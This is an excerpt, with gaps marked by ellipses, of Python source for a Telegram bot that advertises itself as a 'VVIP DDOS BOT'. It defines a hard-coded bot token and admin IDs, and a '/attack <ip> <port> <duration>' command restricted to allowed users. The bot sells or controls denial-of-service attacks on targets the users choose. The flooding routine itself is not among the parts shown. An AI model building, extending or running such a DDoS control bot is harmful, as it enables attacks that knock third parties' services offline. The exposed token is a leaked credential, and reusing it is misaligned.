...
bot = telebot.TeleBot('7475123423:AAFNnxJsLB-kNxd5wdtQthLh-b6d4Bk_abo')

# Admin user IDs
admin_id = {"7439144436", "6406776405", "1600832237"}
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 181:
                ...
                response = f"your attack on Target has completed"
        else:
            response = "Usage: /attack <ip> <port> <duration>. Please provide all parameters."  # Updated command syntax
    else:
...
def welcome_start(message):
    ...
    response = f'''WELCOME TO KRISHNA VVIP DDOS BOT JOIN:-https://t.me/+IxrfyU2iosRjMTA1'''
    bot.reply_to(message, response)
